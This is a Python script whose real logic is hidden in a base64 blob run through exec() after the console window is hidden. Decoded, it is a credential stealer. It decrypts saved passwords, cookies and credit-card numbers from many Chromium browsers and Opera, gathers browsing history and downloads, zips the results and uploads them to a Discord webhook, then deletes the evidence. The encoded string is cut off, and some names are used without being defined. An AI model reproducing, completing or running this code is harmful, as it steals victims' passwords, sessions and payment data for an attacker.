import base64
import json
import os
import shutil
import sqlite3
import ctypes
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

exec(base64.b64decode("dXNlcjMyLlNob3dXaW5kb3coa2VybmVsMzIuR2V0Q29uc29sZVdpbmRvdygpLCAwKQ0KDQpfX0xPR0lOU19fID0gW10NCl9fQ09PS0lFU19fID0gW10NCl9fV0VCX0hJU1RPUllfXyA9IFtdDQpfX0RPV05MT0FEU19fID0gW10NCl9fQ0FSRFNfXyA9IFtdDQoNCmNsYXNzIEJyb3dzZXJzOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB3ZWJob29rKToNCiAgICAgICAgc2VsZi53ZWJob29rID0gU3luY1dlYmhvb2suZnJvbV91cmwod2ViaG9vaykNCg0KICAgICAgICBDaHJvbWl1bSgpDQogICAgICAgIE9wZXJhKCkNCiAgICAgICAgVXBsb2FkKHNlbGYud2ViaG9vaykNCg0KY2xhc3MgVXBsb2FkOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB3ZWJob29rOiBTeW5jV2ViaG9vayk6DQogICAgICAgIHNlbGYud2ViaG9vayA9IHdlYmhvb2sNCg0KICAgICAgICBzZWxmLndyaXRlX2ZpbGVzKCkNCiAgICAgICAgc2VsZi5zZW5kKCkNCiAgICAgICAgc2VsZi5jbGVhbigpDQogICAgDQogICAgZGVmIHdyaXRlX2ZpbGVzKHNlbGYpOg0KICAgICAgICBvcy5tYWtlZGlycygidmF1bHQiLCBleGlzdF9vaz1UcnVlKQ0KICAgICAgICBpZiBfX0xPR0lOU19fOg0KICAgICAgICAgICAgd2l0aCBvcGVuKCJ2YXVsdFxcbG9naW5zLnR4dCIsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgICAgICBmLndyaXRlKCdcbicuam9pbihzdHIoeCkgZm9yIHggaW4gX19MT0dJTlNfXykpDQoNCiAgICAgICAgaWYgX19DT09LSUVTX186DQogICAgICAgICAgICB3aXRoIG9wZW4oInZhdWx0XFxjb29raWVzLnR4dCIsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgICAgICBmLndyaXRlKCdcbicuam9pbihzdHIoeCkgZm9yIHggaW4gX19DT09LSUVTX18pKQ0KDQogICAgICAgIGlmIF9fV0VCX0hJU1RPUllfXzoNCiAgICAgICAgICAgIHdpdGggb3BlbigidmF1bHRcXHdlYl9oaXN0b3J5LnR4dCIsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgICAgICBmLndyaXRlKCdcbicuam9pbihzdHIoeCkgZm9yIHggaW4gX19XRUJfSElTVE9SWV9fKSkNCg0KICAgICAgICBpZiBfX0RPV05MT0FEU19fOg0KICAgICAgICAgICAgd2l0aCBvcGVuKCJ2YXVsdFxcZG93bmxvYWRzLnR4dCIsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgICAgICBmLndyaXRlKCdcbicuam9pbihzdHIoeCkgZm9yIHggaW4gX19ET1dOTE9BRFNfXykpDQoNCiAgICAgICAgaWYgX19DQVJEU19fOg0KICAgICAgICAgICAgd2l0aCBvcGVuKCJ2YXVsdFxcY2FyZHMudHh0IiwgInciLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOg0KICAgICAgICAgICAgICAgIGYud3JpdGUoJ1xuJy5qb2luKHN0cih4KSBmb3IgeCBpbiBfX0NBUkRTX18pKQ0KDQogICAgICAgIHdpdGggWmlwRmlsZSgidmF1bHQuemlwIiwgInciKSBhcyB6aXA6DQogICAgICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKCJ2YXVsdCIpOg0KICAgICAgICAgICAgICAgIHppcC53cml0ZShmInZhdWx0XFx7ZmlsZX0iLCBmaWxlKQ0KDQogICAgZGVmIHNlbmQoc2VsZik6DQogICAgICAgIHNlbGYud2ViaG9vay5zZW5kKA0KICAgICAgICAgICAgZW1iZWQ9RW1iZWQoDQogICAgICAgICAgICAgICAgdGl0bGU9IlZhdWx0IiwNCiAgICAgICAgICAgICAgICBkZXNjcmlwdGlvbj0iYGBgIiArICdcbicuam9pbihzZWxmLnRyZWUoUGF0aCgidmF1bHQiKSkpICsgImBgYCIsDQogICAgICAgICAgICApLA0KICAgICAgICAgICAgZmlsZT1GaWxlKCJ2YXVsdC56aXAiKSwNCiAgICAgICAgKQ0KDQogICAgZGVmIGNsZWFuKHNlbGYpOg0KICAgICAgICBzaHV0aWwucm10cmVlKCJ2YXVsdCIpDQogICAgICAgIG9zLnJlbW92ZSgidmF1bHQuemlwIikNCg0KICAgIGRlZiB0cmVlKHNlbGYsIHBhdGg6IFBhdGgsIHByZWZpeDogc3RyID0gJycsIG1pZGZpeF9mb2xkZXI6IHN0ciA9ICfwn5OCIC0gJywgbWlkZml4X2ZpbGU6IHN0ciA9ICfwn5OEIC0gJyk6DQogICAgICAgIHBpcGVzID0gew0KICAgICAgICAgICAgJ3NwYWNlJzogICcgICAgJywNCiAgICAgICAgICAgICdicmFuY2gnOiAn4pSCICAgJywNCiAgICAgICAgICAgICd0ZWUnOiAgICAn4pSc4pSA4pSAICcsDQogICAgICAgICAgICAnbGFzdCc6ICAgJ+KUlOKUgOKUgCAnLA0KICAgICAgICB9DQoNCiAgICAgICAgaWYgcHJlZml4ID09ICcnOg0KICAgICAgICAgICAgeWllbGQgbWlkZml4X2ZvbGRlciArIHBhdGgubmFtZQ0KDQogICAgICAgIGNvbnRlbnRzID0gbGlzdChwYXRoLml0ZXJkaXIoKSkNCiAgICAgICAgcG9pbnRlcnMgPSBbcGlwZXNbJ3RlZSddXSAqIChsZW4oY29udGVudHMpIC0gMSkgKyBbcGlwZXNbJ2xhc3QnXV0NCiAgICAgICAgZm9yIHBvaW50ZXIsIHBhdGggaW4gemlwKHBvaW50ZXJzLCBjb250ZW50cyk6DQogICAgICAgICAgICBpZiBwYXRoLmlzX2RpcigpOg0KICAgICAgICAgICAgICAgIHlpZWxkIGYie3ByZWZpeH17cG9pbnRlcn17bWlkZml4X2ZvbGRlcn17cGF0aC5uYW1lfSAoe2xlbihsaXN0KHBhdGguZ2xvYignKiovKicpKSl9IGZpbGVzLCB7c3VtKGYuc3RhdCgpLnN0X3NpemUgZm9yIGYgaW4gcGF0aC5nbG9iKCcqKi8qJykgaWYgZi5pc19maWxlKCkpIC8gMTAyNDouMmZ9IGtiKSINCiAgICAgICAgICAgICAgICBleHRlbnNpb24gPSBwaXBlc1snYnJhbmNoJ10gaWYgcG9pbnRlciA9PSBwaXBlc1sndGVlJ10gZWxzZSBwaXBlc1snc3BhY2UnXQ0KICAgICAgICAgICAgICAgIHlpZWxkIGZyb20gc2VsZi50cmVlKHBhdGgsIHByZWZpeD1wcmVmaXgrZXh0ZW5zaW9uKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICB5aWVsZCBmIntwcmVmaXh9e3BvaW50ZXJ9e21pZGZpeF9maWxlfXtwYXRoLm5hbWV9ICh7cGF0aC5zdGF0KCkuc3Rfc2l6ZSAvIDEwMjQ6LjJmfSBrYikiDQoNCmNsYXNzIENocm9taXVtOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKTogDQogICAgICAgIHNlbGYuYXBwZGF0YSA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCiAgICAgICAgc2VsZi5icm93c2VycyA9IHsNCiAgICAgICAgICAgICdhbWlnbyc6IHNlbGYuYXBwZGF0YSArICdcXEFtaWdvXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ3RvcmNoJzogc2VsZi5hcHBkYXRhICsgJ1xcVG9yY2hcXFVzZXIgRGF0YScsDQogICAgICAgICAgICAna29tZXRhJzogc2VsZi5hcHBkYXRhICsgJ1xcS29tZXRhXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ29yYml0dW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJzdzdGFyJzogc2VsZi5hcHBkYXRhICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ3NwdXRuaWsnOiBzZWxmLmFwcGRhdGEgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ3ZpdmFsZGknOiBzZWxmLmFwcGRhdGEgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ2dvb2dsZS1jaHJvbWUnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhJywNCiAgICAgICAgICAgICdlcGljLXByaXZhY3ktYnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXEVwaWMgUHJpdmFjeSBCcm93c2VyXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ21pY3Jvc29mdC1lZGdlJzogc2VsZi5hcHBkYXRhICsgJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ3VyYW4nOiBzZWxmLmFwcGRhdGEgKyAnXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YScsDQogICAgICAgICAgICAneWFuZGV4Jzogc2VsZi5hcHBkYXRhICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGEnLA0KICAgICAgICAgICAgJ2JyYXZlJzogc2VsZi5hcHBkYXRhICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhJywNCiAgICAgICAgICAgICdpcmlkaXVtJzogc2VsZi5hcHBkYXRhICsgJ1xcSXJpZGl1bVxcVXNlciBEYXRhJywNCiAgICAgICAgfQ0KICAgICAgICBzZWxmLnByb2ZpbGVzID0gWw0KICAgICAgICAgICAgJ0RlZmF1bHQnLA0KICAgICAgICAgICAgJ1Byb2ZpbGUgMScsDQogICAgICAgICAgICAnUHJvZmlsZSAyJywNCiAgICAgICAgICAgICdQcm9maWxlIDMnLA0KICAgICAgICAgICAgJ1Byb2ZpbGUgNCcsDQogICAgICAgICAgICAnUHJvZmlsZSA1JywNCiAgICAgICAgXSANCiAgICAgICAgDQogICAgICAgIGZvciBfLCBwYXRoIGluIHNlbGYuYnJvd3NlcnMuaXRlbXMoKToNCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgICAgICBzZWxmLm1hc3Rlcl9rZXkgPSBzZWxmLmdldF9tYXN0ZXJfa2V5KGYne3BhdGh9XFxMb2NhbCBTdGF0ZScpDQogICAgICAgICAgICBpZiBub3Qgc2VsZi5tYXN0ZXJfa2V5Og0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICANCiAgICAgICAgICAgIGZvciBwcm9maWxlIGluIHNlbGYucHJvZmlsZXM6DQogICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGggKyAnXFwnICsgcHJvZmlsZSk6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgb3BlcmF0aW9ucyA9IFsNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5nZXRfbG9naW5fZGF0YSwNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5nZXRfY29va2llcywNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5nZXRfd2ViX2hpc3RvcnksDQogICAgICAgICAgICAgICAgICAgIHNlbGYuZ2V0X2Rvd25sb2FkcywNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5nZXRfY3JlZGl0X2NhcmRzLA0KICAgICAgICAgICAgICAgIF0NCg0KICAgICAgICAgICAgICAgIGZvciBvcGVyYXRpb24gaW4gb3BlcmF0aW9uczoNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlcmF0aW9uKHBhdGgsIHByb2ZpbGUpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgIGRlZiBnZXRfbWFzdGVyX2tleShzZWxmLCBwYXRoOiBzdHIpIC0+IHN0cjoNCiAgICAgICAgaWYgJ29zX2NyeXB0JyBub3QgaW4gb3BlbihwYXRoLCAncicsIGVuY29kaW5nPSd1dGYtOCcpLnJlYWQoKToNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgICAgICBjID0gZi5yZWFkKCkNCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpDQoNCiAgICAgICAgbWFzdGVyX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkNCiAgICAgICAgbWFzdGVyX2tleSA9IG1hc3Rlcl9rZXlbNTpdDQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0NCiAgICAgICAgcmV0dXJuIG1hc3Rlcl9rZXkNCg0KICAgIGRlZiBkZWNyeXB0X3Bhc3N3b3JkKHNlbGYsIGJ1ZmY6IGJ5dGVzLCBtYXN0ZXJfa2V5OiBieXRlcykgLT4gc3RyOg0KICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQ0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KDQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcw0KDQogICAgZGVmIGdldF9sb2dpbl9kYXRhKHNlbGYsIHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyKToNCiAgICAgICAgbG9naW5fZGIgPSBmJ3twYXRofVxce3Byb2ZpbGV9XFxMb2dpbiBEYXRhJw0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMobG9naW5fZGIpOg0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgc2h1dGlsLmNvcHkobG9naW5fZGIsICdsb2dpbl9kYicpDQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoJ2xvZ2luX2RiJykNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucycpDQogICAgICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6DQogICAgICAgICAgICBpZiBub3Qgcm93WzBdIG9yIG5vdCByb3dbMV0gb3Igbm90IHJvd1syXToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgICAgICBwYXNzd29yZCA9IHNlbGYuZGVjcnlwdF9wYXNzd29yZChyb3dbMl0sIHNlbGYubWFzdGVyX2tleSkNCiAgICAgICAgICAgIF9fTE9HSU5TX18uYXBwZW5kKFR5cGVzLkxvZ2luKHJvd1swXSwgcm93WzFdLCBwYXNzd29yZCkpDQoNCiAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgIG9zLnJlbW92ZSgnbG9naW5fZGInKQ0KDQogICAgZGVmIGdldF9jb29raWVzKHNlbGYsIHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyKToNCiAgICAgICAgY29va2llX2RiID0gZid7cGF0aH1cXHtwcm9maWxlfVxcTmV0d29ya1xcQ29va2llcycNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGNvb2tpZV9kYik6DQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICBzaHV0aWwuY29weShjb29raWVfZGIsICdjb29raWVfZGInKQ0KICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCdjb29raWVfZGInKQ0KICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgICAgIGN1cnNvci5leGVjdXRlKCdTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIHBhdGgsIGVuY3J5cHRlZF92YWx1ZSxleHBpcmVzX3V0YyBGUk9NIGNvb2tpZXMnKQ0KICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgaWYgbm90IHJvd1swXSBvciBub3Qgcm93WzFdIG9yIG5vdCByb3dbMl0gb3Igbm90IHJvd1szXToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgICAgICBjb29raWUgPSBzZWxmLmRlY3J5cHRfcGFzc3dvcmQocm93WzNdLCBzZWxmLm1hc3Rlcl9rZXkpDQogICAgICAgICAgICBfX0NPT0tJRVNfXy5hcHBlbmQoVHlwZXMuQ29va2llKHJvd1swXSwgcm93WzFdLCByb3dbMl0sIGNvb2tpZSwgcm93WzRdKSkNCg0KICAgICAgICBjb25uLmNsb3NlKCkNCiAgICAgICAgb3MucmVtb3ZlKCdjb29raWVfZGInKQ0KDQogICAgZGVmIGdldF93ZWJfaGlzdG9yeShzZWxmLCBwYXRoOiBzdHIsIHByb2ZpbGU6IHN0cik6DQogICAgICAgIHdlYl9oaXN0b3J5X2RiID0gZid7cGF0aH1cXHtwcm9maWxlfVxcSGlzdG9yeScNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHdlYl9oaXN0b3J5X2RiKToNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHNodXRpbC5jb3B5KHdlYl9oaXN0b3J5X2RiLCAnd2ViX2hpc3RvcnlfZGInKQ0KICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCd3ZWJfaGlzdG9yeV9kYicpDQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoJ1NFTEVDVCB1cmwsIHRpdGxlLCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzJykNCiAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToNCiAgICAgICAgICAgIGlmIG5vdCByb3dbMF0gb3Igbm90IHJvd1sxXSBvciBub3Qgcm93WzJdOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQoNCiAgICAgICAgICAgIF9fV0VCX0hJU1RPUllfXy5hcHBlbmQoVHlwZXMuV2ViSGlzdG9yeShyb3dbMF0sIHJvd1sxXSwgcm93WzJdKSkNCg0KICAgICAgICBjb25uLmNsb3NlKCkNCiAgICAgICAgb3MucmVtb3ZlKCd3ZWJfaGlzdG9yeV9kYicpDQoNCiAgICBkZWYgZ2V0X2Rvd25sb2FkcyhzZWxmLCBwYXRoOiBzdHIsIHByb2ZpbGU6IHN0cik6DQogICAgICAgIGRvd25sb2Fkc19kYiA9IGYne3BhdGh9XFx7cHJvZmlsZX1cXEhpc3RvcnknDQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkb3dubG9hZHNfZGIpOg0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgc2h1dGlsLmNvcHkoZG93bmxvYWRzX2RiLCAnZG93bmxvYWRzX2RiJykNCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCgnZG93bmxvYWRzX2RiJykNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIHRhYl91cmwsIHRhcmdldF9wYXRoIEZST00gZG93bmxvYWRzJykNCiAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToNCiAgICAgICAgICAgIGlmIG5vdCByb3dbMF0gb3Igbm90IHJvd1sxXToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgICAgICBfX0RPV05MT0FEU19fLmFwcGVuZChUeXBlcy5Eb3dubG9hZChyb3dbMF0sIHJvd1sxXSkpDQoNCiAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgIG9zLnJlbW92ZSgnZG93bmxvYWRzX2RiJykNCg0KICAgIGRlZiBnZXRfY3JlZGl0X2NhcmRzKHNlbGYsIHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyKToNCiAgICAgICAgY2FyZHNfZGIgPSBmJ3twYXRofVxce3Byb2ZpbGV9XFxXZWIgRGF0YScNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGNhcmRzX2RiKToNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHNodXRpbC5jb3B5KGNhcmRzX2RiLCAnY2FyZHNfZGInKQ0KICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCdjYXJkc19kYicpDQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoJ1NFTEVDVCBuYW1lX29uX2NhcmQsIGV4cGlyYXRpb25fbW9udGgsIGV4cGlyYXRpb25feWVhciwgY2FyZF9udW1iZXJfZW5jcnlwdGVkLCBkYXRlX21vZGlmaWVkIEZST00gY3JlZGl0X2NhcmRzJykNCiAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToNCiAgICAgICAgICAgIGlmIG5vdCByb3dbMF0gb3Igbm90IHJvd1sxXSBvciBub3Qgcm93WzJdIG9yIG5vdCByb3dbM106DQogICAgICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICAgICAgY2FyZF9udW1iZXIgPSBzZWxmLmRlY3J5cHRfcGFzc3dvcmQocm93WzNdLCBzZWxmLm1hc3Rlcl9rZXkpDQogICAgICAgICAgICBfX0NBUkRTX18uYXBwZW5kKFR5cGVzLkNyZWRpdENhcmQocm93WzBdLCByb3dbMV0sIHJvd1syXSwgY2FyZF9udW1iZXIsIHJvd1s0XSkpDQoNCiAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgIG9zLnJlbW92ZSgnY2FyZHNfZGInKQ0KDQpjbGFzcyBPcGVyYToNCiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZToNCiAgICAgICAgc2VsZi5yb2FtaW5nID0gb3MuZ2V0ZW52KCJBUFBEQVRBIikNCiAgICAgICAgc2VsZi5wYXRocyA9IHsNCiAgICAgICAgICAgICdvcGVyYWd4Jzogc2VsZi5yb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZScsDQogICAgICAgICAgICAnb3BlcmEnOiBzZWxmLnJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJw0KICAgICAgICB9DQoNCiAgICAgICAgZm9yIF8sIHBhdGgsIGluIHNlbGYucGF0aHMuaXRlbXMoKToNCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgICAgICBzZWxmLm1hc3Rlcl9rZXkgPSBzZWxmLmdldF9tYXN0ZXJfa2V5KGYne3BhdGh9XFxMb2NhbCBTdGF0ZScpDQogICAgICAgICAgICBpZiBub3Qgc2VsZi5tYXN0ZXJfa2V5Og0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQoNCiAgICAgICAgICAgIG9wZXJhdGlvbnMgPSBbDQogICAgICAgICAgICAgICAgc2VsZi5nZXRfbG9naW5fZGF0YSwNCiAgICAgICAgICAgICAgICBzZWxmLmdldF9jb29raWVzLA0KICAgICAgICAgICAgICAgIHNlbGYuZ2V0X3dlYl9oaXN0b3J5LA0KICAgICAgICAgICAgICAgIHNlbGYuZ2V0X2Rvd25sb2FkcywNCiAgICAgICAgICAgICAgICBzZWxmLmdldF9jcmVkaXRfY2FyZHMNCiAgICAgICAgICAgIF0NCg0KICAgICAgICAgICAgZm9yIG9wZXJhdGlvbiBpbiBvcGVyYXRpb25zOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgb3BlcmF0aW9uKHBhdGgpDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICBkZWYgZ2V0X21hc3Rlcl9rZXkoc2VsZiwgcGF0aDogc3RyKSAtPiBzdHI6DQogICAgICAgIGlmICdvc19jcnlwdCcgbm90IGluIG9wZW4ocGF0aCwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKS5yZWFkKCk6DQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOg0KICAgICAgICAgICAgYyA9IGYucmVhZCgpDQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQ0KDQogICAgICAgIG1hc3Rlcl9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pDQogICAgICAgIG1hc3Rlcl9rZXkgPSBtYXN0ZXJfa2V5WzU6XQ0KICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdDQoNCiAgICAgICAgcmV0dXJuIG1hc3Rlcl9rZXkNCg0KICAgIGRlZiBkZWNyeXB0X3Bhc3N3b3JkKHNlbGYsIGJ1ZmY6IGJ5dGVzLCBtYXN0ZXJfa2V5OiBieXRlcykgLT4gc3RyOg0KICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQ0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KDQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcw0KDQogICAgZGVmIGdldF9sb2dpbl9kYXRhKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZToNCiAgICAgICAgbG9naW5fZGIgPSBmJ3twYXRofVxcTG9naW4gRGF0YScNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGxvZ2luX2RiKToNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHNodXRpbC5jb3B5KGxvZ2luX2RiLCAnbG9naW5fZGInKQ0KICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCdsb2dpbl9kYicpDQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBvcmlnaW5fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQ0KICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgaWYgbm90IHJvd1swXSBvciBub3Qgcm93WzFdIG9yIG5vdCByb3dbMl06DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIHBhc3N3b3JkID0gc2VsZi5kZWNyeXB0X3Bhc3N3b3JkKHJvd1syXSwgc2VsZi5tYXN0ZXJfa2V5KQ0KICAgICAgICAgICAgX19MT0dJTlNfXy5hcHBlbmQoVHlwZXMuTG9naW4ocm93WzBdLCByb3dbMV0sIHBhc3N3b3JkKSkNCg0KICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KICAgICAgICBjb25uLmNsb3NlKCkNCiAgICAgICAgb3MucmVtb3ZlKCdsb2dpbl9kYicpDQoNCiAgICBkZWYgZ2V0X2Nvb2tpZXMoc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOg0KICAgICAgICBjb29raWVzX2RiID0gZid7cGF0aH1cXE5ldHdvcmtcXENvb2tpZXMnDQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhjb29r